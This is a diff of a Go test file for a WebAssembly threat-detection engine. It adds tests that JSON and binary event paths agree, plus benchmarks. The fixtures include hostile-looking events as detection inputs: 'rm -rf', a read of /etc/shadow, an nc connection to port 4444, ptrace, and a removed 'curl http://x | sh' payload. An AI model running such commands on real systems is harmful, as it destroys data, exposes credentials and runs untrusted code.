@@ -5,6 +5,7 @@ import (
 	"context"
 	"errors"
 	"io"
+	"net"
 	"os"
 	"path/filepath"
 	"strings"
@@ -14,6 +15,8 @@ import (
 
 	"github.com/bytecodealliance/wasmtime-go/v17"
 	"github.com/sirupsen/logrus"
+	"github.com/wasm-threat-detector/host/internal/collector"
+	"github.com/wasm-threat-detector/host/internal/ebpf"
 	"github.com/wasm-threat-detector/host/internal/events"
 )
 
@@ -452,8 +455,127 @@ func BenchmarkInvokeEcho(b *testing.B) {
 	}
 }
 
-func BenchmarkRealSuspiciousShell(b *testing.B) {
-	p := filepath.Join(builtRules, "suspicious_shell.wasm")
+func TestBinaryEncodingFallsBackWithoutDetectRaw(t *testing.T) {
+	e := newEngine(t, quick)
+	load(t, e, "nine", "always9.wat")
+	e.SetEncoding(EncodingBinary)
+	if e.Encoding() != EncodingBinary {
+		t.Fatal("SetEncoding did not stick")
+	}
+	ev := processEvent("ls")
+	ev.Binary = []byte("opaque payload the WAT stub cannot read")
+	res, err := e.DetectThreat(context.Background(), ev)
+	if err != nil || len(res) != 1 || res[0].RuleName != "nine" {
+		t.Fatalf("fallback result %+v, %v", res, err)
+	}
+	if st := e.Stats()["nine"]; st.Calls != 1 || st.CallsRaw != 0 {
+		t.Errorf("stats %+v, want one JSON call", st)
+	}
+	_, err = e.InvokeRaw("nine", ev.Binary)
+	re := ruleErr(t, err, TrapABI)
+	if !strings.Contains(re.Error(), "detect_raw") {
+		t.Errorf("error does not name the missing export: %v", re)
+	}
+	if got, err := e.Invoke("nine", []byte("x")); err != nil || got != 9 {
+		t.Fatalf("instance should survive an ABI error: %d, %v", got, err)
+	}
+	if st := e.Stats()["nine"]; st.Errors != 1 || st.Reinstantiations != 0 || st.TrapsOther != 0 {
+		t.Errorf("ABI error accounting %+v", st)
+	}
+	for in, want := range map[string]Encoding{"": EncodingJSON, "json": EncodingJSON, "binary": EncodingBinary, "raw": EncodingBinary} {
+		if got, err := ParseEncoding(in); err != nil || got != want {
+			t.Errorf("ParseEncoding(%q) = %q, %v", in, got, err)
+		}
+	}
+	if _, err := ParseEncoding("xml"); err == nil {
+		t.Error("ParseEncoding accepted xml")
+	}
+}
+
+// parityCases are kernel events covering every type the collector emits.
+func parityCases() []*ebpf.Event {
+	return []*ebpf.Event{
+		{Type: ebpf.EventProcessExec, TypeName: "process_exec", PID: 100, PPID: 1, UID: 0, GID: 0, Comm: "bash",
+			Filename: "/usr/bin/bash", Argv: []string{"bash", "-c", "rm -rf /tmp/x"}},
+		{Type: ebpf.EventProcessExec, TypeName: "process_exec", PID: 101, PPID: 1, UID: 65534, GID: 65534, Comm: "ls",
+			Filename: "/usr/bin/ls", Argv: []string{"ls", "-l"}},
+		{Type: ebpf.EventProcessExit, TypeName: "process_exit", PID: 100, Comm: "bash", ExitCode: 1},
+		{Type: ebpf.EventFileOpen, TypeName: "file_open", PID: 102, UID: 0, Comm: "vi", Filename: "/etc/shadow", Flags: 0x241},
+		{Type: ebpf.EventFileOpen, TypeName: "file_open", PID: 102, UID: 1000, Comm: "cat", Filename: "/home/alice/notes.txt"},
+		{Type: ebpf.EventNetworkConnect, TypeName: "network_connect", PID: 103, Comm: "nc", Family: 2, Protocol: "tcp",
+			SrcIP: net.IPv4(10, 0, 0, 2).To4(), DstIP: net.IPv4(1, 2, 3, 4).To4(), SrcPort: 40000, DstPort: 4444},
+		{Type: ebpf.EventNetworkAccept, TypeName: "network_accept", PID: 104, Comm: "sshd", Family: 2, Protocol: "tcp",
+			SrcIP: net.IPv4(10, 0, 0, 2).To4(), DstIP: net.IPv4(10, 0, 0, 9).To4(), SrcPort: 22, DstPort: 51000},
+		{Type: ebpf.EventSyscall, TypeName: "syscall", PID: 105, PPID: 1, Comm: "gdb", SyscallNr: 101, SyscallName: "ptrace"},
+		{Type: ebpf.EventSyscall, TypeName: "syscall", PID: 105, PPID: 1, Comm: "gdb", SyscallNr: 59, SyscallName: "execve"},
+	}
+}
+
+// The P1.3 acceptance: the JSON path and the binary path give the same level
+// for the same kernel event, for both real rules. Stateful rules get one
+// instance per path so both see the same history.
+func TestRawAndJSONPathsAgreeOnRealModules(t *testing.T) {
+	shell := realModule(t, "suspicious_shell.wasm")
+	ml := realModule(t, "ml_detector.wasm")
+	e := newEngine(t, DefaultLimits())
+	for name, path := range map[string]string{"shell_json": shell, "shell_raw": shell, "ml_json": ml, "ml_raw": ml} {
+		if err := e.LoadRule(name, path); err != nil {
+			t.Fatal(err)
+		}
+	}
+	var names collector.NameCache
+	positives := 0
+	cases := parityCases()
+	for i, ev := range cases {
+		ev.Raw = ev.Record()
+		out := collector.EventFromEBPF(ev, &names)
+		if out.Binary == nil {
+			t.Fatalf("case %d: no binary payload", i)
+		}
+		js, err := out.ToJSON()
+		if err != nil {
+			t.Fatal(err)
+		}
+		for _, pair := range [][2]string{{"shell_json", "shell_raw"}, {"ml_json", "ml_raw"}} {
+			a, err := e.Invoke(pair[0], js)
+			if err != nil {
+				t.Fatalf("case %d %s json: %v", i, pair[0], err)
+			}
+			b, err := e.InvokeRaw(pair[1], out.Binary)
+			if err != nil {
+				t.Fatalf("case %d %s raw: %v", i, pair[1], err)
+			}
+			if a != b {
+				t.Errorf("case %d (%s) %s: json=%d raw=%d", i, ev.TypeName, pair[0], a, b)
+			}
+			if a > 0 {
+				positives++
+			}
+		}
+	}
+	if positives == 0 {
+		t.Error("no case produced a detection; the comparison is vacuous")
+	}
+	st := e.Stats()
+	if st["shell_raw"].CallsRaw != uint64(len(cases)) || st["shell_json"].CallsRaw != 0 {
+		t.Errorf("raw call accounting: %+v / %+v", st["shell_raw"], st["shell_json"])
+	}
+
+	// Under EncodingBinary DetectThreat routes raw-capable rules through detect_raw.
+	e.SetEncoding(EncodingBinary)
+	out := collector.EventFromEBPF(cases[0], &names)
+	if _, err := e.DetectThreat(context.Background(), out); err != nil {
+		t.Fatal(err)
+	}
+	for name, before := range st {
+		if after := e.Stats()[name]; after.CallsRaw != before.CallsRaw+1 {
+			t.Errorf("%s: CallsRaw %d -> %d, want +1", name, before.CallsRaw, after.CallsRaw)
+		}
+	}
+}
+
+func benchReal(b *testing.B, module string, raw bool) {
+	p := filepath.Join(builtRules, module)
 	if _, err := os.Stat(p); err != nil {
 		b.Skip("module not built")
 	}
@@ -461,14 +583,61 @@ func BenchmarkRealSuspiciousShell(b *testing.B) {
 	lg.SetOutput(io.Discard)
 	e := New(lg, DefaultLimits())
 	defer e.Close()
-	if err := e.LoadRule("suspicious_shell", p); err != nil {
+	if err := e.LoadRule("r", p); err != nil {
 		b.Fatal(err)
 	}
-	payload, _ := processEvent("bash -c 'curl http://x | sh'").ToJSON()
+	ev := parityCases()[0]
+	ev.Raw = ev.Record()
+	var names collector.NameCache
+	out := collector.EventFromEBPF(ev, &names)
+	js, _ := out.ToJSON()
 	b.ResetTimer()
 	for i := 0; i < b.N; i++ {
-		if _, err := e.Invoke("suspicious_shell", payload); err != nil {
+		var err error
+		if raw {
+			_, err = e.InvokeRaw("r", out.Binary)
+		} else {
+			_, err = e.Invoke("r", js)
+		}
+		if err != nil {
 			b.Fatal(err)
 		}
+	}
+}
+
+func BenchmarkRealSuspiciousShellJSON(b *testing.B) { benchReal(b, "suspicious_shell.wasm", false) }
+func BenchmarkRealSuspiciousShellRaw(b *testing.B)  { benchReal(b, "suspicious_shell.wasm", true) }
+func BenchmarkRealMLDetectorJSON(b *testing.B)      { benchReal(b, "ml_detector.wasm", false) }
+func BenchmarkRealMLDetectorRaw(b *testing.B)       { benchReal(b, "ml_detector.wasm", true) }
+
+// BenchmarkEventPathEndToEnd measures collector conversion plus rule call for
+// one exec event, the way DetectThreat sees it, on each encoding.
+func BenchmarkEventPathEndToEnd(b *testing.B) {
+	p := filepath.Join(builtRules, "suspicious_shell.wasm")
+	if _, err := os.Stat(p); err != nil {
+		b.Skip("module not built")
+	}
+	for _, enc := range []Encoding{EncodingJSON, EncodingBinary} {
+		b.Run(string(enc), func(b *testing.B) {
+			lg := logrus.New()
+			lg.SetOutput(io.Discard)
+			e := New(lg, DefaultLimits())
+			defer e.Close()
+			if err := e.LoadRule("r", p); err != nil {
+				b.Fatal(err)
+			}
+			e.SetEncoding(enc)
+			ev := parityCases()[0]
+			ev.Raw = ev.Record()
+			var names collector.NameCache
+			ctx := context.Background()
+			b.ResetTimer()
+			for i := 0; i < b.N; i++ {
+				out := collector.EventFromEBPF(ev, &names)
+				if _, err := e.DetectThreat(ctx, out); err != nil {
+					b.Fatal(err)
+				}
+			}
+		})
 	}
 }
